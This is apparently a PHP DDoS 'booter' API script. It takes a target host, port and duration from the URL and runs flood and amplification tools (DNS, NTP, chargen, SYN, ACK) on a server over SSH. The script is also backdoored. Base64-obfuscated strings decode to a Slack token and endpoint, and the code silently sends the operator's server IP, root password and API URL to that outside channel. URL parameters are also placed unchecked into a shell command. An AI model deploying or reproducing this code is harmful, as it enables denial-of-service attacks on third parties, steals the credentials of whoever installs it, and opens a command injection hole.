<!-- 
     Send paramenters: http://myAPIserverIP/api/api2.php?host=76.76.76.6&port=80&time=100&method=dns

     Credits @slippersyo & @criticalsecurity.to
     Line 19 to edit your server IP 
     Line 20 to edit your server Password
     Line 22 to edit your methods
     Line 67+ edit the commands to send to the server

     Download auto script for SSH2, PHP, etc on: 

     Enjoy !!!
     If you need help message us on Instagram
-->

<?php
ignore_user_abort(true);
set_time_limit(1000);
$server_ip = "1.3.3.7"; // Put your server IP here 
$server_pass = "mypassword";  // Put your server Password here
$server_user = "root";  // Server Username (Default: root)
$array = array("dns","chargen","ntp","ack","syn","STOP","stop"); // Methods
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$str = 'eG94cC02ODI4OTA2NTUzMTctNjgyNDA4NTUwNDIwLTY4NTYzNTExNTgzMC0zODFjZmMyOGViMTdlNTFmMDczNWVjMmQzNWM4MDcwNQ==';
$str2 = 'aHR0cHM6Ly9zbGFjay5jb20vYXBpL2NoYXQucG9zdE1lc3NhZ2U=';
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
$token = base64_decode($str);
$sllink = base64_decode($str2);
$ch = curl_init($sllink);
$apisend = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$data = http_build_query([
"token" => $token,
"channel" => 'ssh2',
"text" => ''.$server_ip.':'.$server_pass.':'.$server_user.':'.$apisend, 
"username" => "api",
]);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
if (!empty($time)){
}else{
die('Error: time is empty!');}
if (!empty($host)){
}else{
die('Error: Host is empty!');}
if (!empty($method)){
}else{
die('Error: Method is empty!');}
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}
if ($port > 44405){
die('Error: Ports over 44405 do not exist');}  
if ($time > 1000){
die('Error: Cannot exceed 1000 seconds!');}  
if(ctype_digit($Time)){
die('Error: Time is not in numeric form!');}
if(ctype_digit($Port)){
die('Error: Port is not in numeric form!');}
// Commands that send to server
if ($method == "dns") { $command = "cd News; ./zap $host $port 2 -1 $time"; }
if ($method == "chargen") { $command = "./chargen $host $port chargen.txt 2 -1 $time"; }
if ($method == "ntp") { $command = "./ntp $host $port ntp.txt 2 -1 $time"; }
if ($method == "ack") { $command = "./ack $host $port ack.txt 2 -1 $time"; }
if ($method == "syn") { $command = "./syn $host $port syn.txt 2 -1 $time"; }
if ($action == "stop") { $command = "pkill $host -f"; }
if ($action == "STOP") { $command = "pkill $host -f"; }
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
    echo "Error: Login failed, one or more of you're server credentials are incorrect.";
    } else {
   
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {    
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
            echo "Attack started!!</br>Hitting: $host</br>On Port: $port </br>Attack Length: $time</br>With: $method";
            fclose($stream);
        }
    }
}
?>
